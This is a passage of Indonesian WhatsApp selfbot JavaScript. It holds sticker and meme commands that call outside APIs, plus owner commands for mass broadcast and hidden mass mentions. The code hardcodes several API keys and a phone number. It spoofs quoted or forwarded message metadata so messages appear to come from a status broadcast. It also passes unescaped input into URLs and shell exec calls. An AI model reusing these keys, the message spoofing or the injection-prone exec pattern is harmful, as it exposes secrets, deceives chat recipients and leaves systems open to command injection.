             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'battlefield': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz|Teknologi`)
             makell = args.join(" ")
             ll1 = makell.split("|")[0];
             ll2 = makell.split("|")[1];
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'coffeecup': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'coffeecup2': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'neon': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
case 'glow': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'summer': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'flower': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=flower&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'burn': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
       case 'quote': 
                  if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
             makell = args.join(" ")
             reply(mess.wait)
             anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
             buffer1 = await getBuffer(anu.result.url)
             pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
             break
		case 'wasted':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					    reply(mess.wait)
					owgi = await  pebz.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu2 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
					exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					pebz.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					
					} else {
					reply('Gunakan foto!')
					}
					break
             case 'smimi': 
             reply('Loading.... ')
             top = arg.split('|')[0]
             bottom = arg.split('|')[1]
             var imgbb = require('imgbb-uploader')
             if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
             ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
             owgi = await  pebz.downloadAndSaveMediaMessage(ger)
             anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
             teks = `${anu.display_url}`
             ranp = getRandom('.gif')
             rano = getRandom('.webp')
             anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
             sendStickerUrl(from, `${anu1}`)
             } else {
             reply('Gunakan foto/stiker!')
             }
             break
//ðŸ€ðŸ’° MALING
case 'trigger':

					var imgbb = require('imgbb-uploader')

					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply('sabarr tes tes')
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  pebz.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					pebz.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
					case 'sampah':
					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	           		reply(mess.wait)
	                 owgi = await pebz.downloadAndSaveMediaMessage(ger)
	                 let aanu = await imgbb("55e7971b786836b9966eca4528210ba8", owgi)
	                let teks = `${aanu.display_url}`
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${teks}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					pebz.sendMessage(from, buffer, image, {quoted: mek})
                   }
              break       
		case 'gay':

					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					sticWait(from)
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					owgi = await  pebz.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					pebz.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color('Succes send sticker...'))
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					break
             case 'stickmeme':
               case 'smeme':
             if(!c) return reply(`Example :Reply sticker dengan Caption${prefix + command} pebz` )
             if (mek.message.extendedTextMessage != undefined || mek.message.extendedTextMessage != null) {
             ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
             reply(mess.wait)
             owgi = await pebz.downloadMediaMessage(ger)
             await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
             var imgbb = require('imgbb-uploader')
             anu = await imgbb("0ffc503f79f9b051b82e643eb3e3a746", './stickmeme.jpeg')
             teks = `${anu.display_url}`
             sendStickerUrl(from, `https://cililitan.herokuapp.com/api/memegen1?teks=${c}&img_url=${teks}`, mek)
             fs.unlinkSync('./stickmeme.jpeg')
             }
             break
             case 'stickmeme2':
               case 'smeme2':
             if(!c)return reply(`Cara Makeknya, Pertama Reply Stikernya, Kedua ketik : ${prefix + command} Text1|Text2`)
             s11 = c.split('|')[0]
             s12 = c.split('|')[1] 
             if(!s12)return reply('Text2 nya pake bang..')
             if (mek.message.extendedTextMessage != undefined || mek.message.extendedTextMessage != null) {
             ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
             reply(mess.wait)
             owgi = await pebz.downloadMediaMessage(ger)
             await fs.writeFileSync(`./stickmeme.jpeg`, owgi)
             var imgbb = require('imgbb-uploader')
             anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
             teks = `${anu.display_url}`
             sendStickerUrl(from, `https://cililitan.herokuapp.com/api/memegen2?teks1=${s11}&teks2=${s12}&img_url=${teks}`, mek)
             fs.unlinkSync('./stickmeme.jpeg')
             }
             break
case 'tikmarker':
if (!isGroup) return reply(mess.only.group)
if(!c) return reply(`Example : ${prefix}tikmarker nama|autor`)
g1 = c.split('|')[0]
g2 = c.split('|')[1]
reply(mess.wait)
tikmarker = await getBuffer(`https://zekais-api.herokuapp.com/oxy/tiktok?text=${g1}&text2=${g2}&apikey=ysBYLTIc`)
pebz.sendMessage(from,tikmarker,image,{quoted:mek})
break

			case 'wooden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
			case 'golden': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} pebz Teknologi`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					pebz.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
					break
               case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break                  

           case 'self':
           if (!isOwner) return reply(mess.only.ownerB)
           if (self === true) return 
            let pebzk = {
            contextInfo: {
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            isForwarded: true,
            forwardingScore: 8,
           quotedMessage: {
           imageMessage: {
           caption: fake,
           jpegThumbnail: gambar,
           mimetype: 'image/jpeg',
           }
           }
           }
           }
           self = true 
           let lat =`_SUCESSS_`
           pebz.sendMessage(from, lat, MessageType.text, pebzk)
           break  
           case 'status': 
           uptime = process.uptime()
           let pingnye = speednye();
           let ping = speednye() - pingnye 
           
           const { 
           os_version } = pebz.user.phone
           let akutext =`_「STATUS」_
*NAMA : ${pebz.user.name}*
*BROWSER : ${pebz.browserDescription[1]}*
*HOST : ${pebz.browserDescription[0]}*
*VERSI : ${pebz.browserDescription[2]}*
*HP : ${pebz.user.phone.device_manufacturer}*
*WA : ${pebz.user.phone.wa_version}*
*RAM : ${(process.memoryUsage().heapUsed / 111 / 1029 ).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1000 / 2000 )}MB*
*OS : ${os_version} ANDROID*
*SPEED : ${ping.toFixed(4)} SECOND*
*Runtime : ${kyun(uptime)}*
` 
            let faker = {
            contextInfo: {
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            isForwarded: true,
            forwardingScore: 8,
           quotedMessage: {
           imageMessage: {
           caption: fake,
           jpegThumbnail: gambar,
           mimetype: 'image/jpeg',
           }
           }
           }
           }
           pebz.sendMessage(from, akutext, text, faker) 
           break
           case 'public':
           if (!isOwner) return reply(mess.only.ownerB)
           if (self === false) return 
           let pebzganskun = {
           contextInfo: {
           participant: '0@s.whatsapp.net',
           remoteJid: 'status@broadcast',
           isForwarded: true,
           forwardingScore: 8,
           quotedMessage: {
           imageMessage: {
           caption: fake,
           jpegThumbnail: gambar,
           mimetype: 'image/jpeg',
          //pageCount: 0
           }
           }
           }
           }
           self = false
           let breh =`_SUCESSS_`
           pebz.sendMessage(from, breh, MessageType.text, pebzganskun)
           break
           case 'nulis':
           case 'write':
           try {
           if (args.length < 1) return reply(mess.notxt)
           reply(mess.wait)
           bo = args.join(' ')
           api = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${bo}&apikey=apivinz`)
           await pebz.sendMessage(from, api, image, { quoted:mek,caption:'Done!' })
           } catch(e) { 
              reply(`${e}`)
           }
           break 
		  case 'sticker2':
		  case 's2':
		  var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker)) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await  pebz.downloadAndSaveMediaMessage(ger)
anu = await imgbb("f0b190d67308d34811fab9c56fe8aba7", owgi)
tekks = `${anu.display_url}`
anu1 = `${tekks}`
sendStickerFromUrl(from, `${anu1}`, mess.success)
} else {
reply('Gunakan foto!')
}
break  
          case "sticker":
      case "stiker":
      case "sg":
      case "s":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await pebz.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              pebz.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await pebz.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              pebz.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
           case 'owner1':
         members_ids = []
         for (let mem of groupMembers) {
         members_ids.push(mem.jid)
         }
         vcard2 = 'BEGIN:VCARD\n'
         + 'VERSION:3.0\n'
         + `FN:ZansLord\n`
         + `ORG: Creator Bot ;\n`
         + `TEL;type=CELL;type=VOICE;waid=6285869074622:6285869074622\n`
         + 'END:VCARD'.trim()
         pebz.sendMessage(from, {displayName: `Creator Bot`, vcard: vcard2}, contact, 
         { quoted: fkontak, 
         })
         reply('*_Jangan Lupa Subscrib_*\nhttps://youtube.com/c/ZansLord')
         break
          case 'bc':
         if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
         if (args.length < 1) return reply('.......')
         anu = await pebz.chats.all()
         if (isMedia && !mek.message.videoMessage || isQuotedImage) {
         const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
         bc = await pebz.downloadMediaMessage(encmedia)
         for (let _ of anu) {
         pebz.sendMessage(_.jid, bc, image, { caption: `[ PebselfBot izin Broadcast ]\n\n${body.slice(4)}` })
         }
         reply('Suksess broadcast')
         } else {
         for (let _ of anu) {
         sendMess(_.jid, `[ *BOT BROADCAST* ]\n\n${body.slice(4)}`)
         }
         reply('Suksess broadcast')
         }
		break
		case 'hidetag':
		if (!isOwner) return reply(mess.only.ownerB)
    	var value = args.join(' ')
		var group = await pebz.groupMetadata(from)
		var member = group['participants']
		var mem = []
    	member.map(async adm => {
		mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		})
		var optionshidetag = {
	    text: value,
		contextInfo: { mentionedJid: mem },
		quoted: mek
		}
	    pebz.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption":'LordItsPebri',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": gambar} }  } })
					break
          default: 
          if (isCmd) {
                 reply(`Sorry bro, command *${prefix}${command}* gk ada di list *${prefix}help*`)
                    }
					if (isGroup && budy != undefined) {
				} else {
						console.log(color('[SYSTEM]','yellow'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
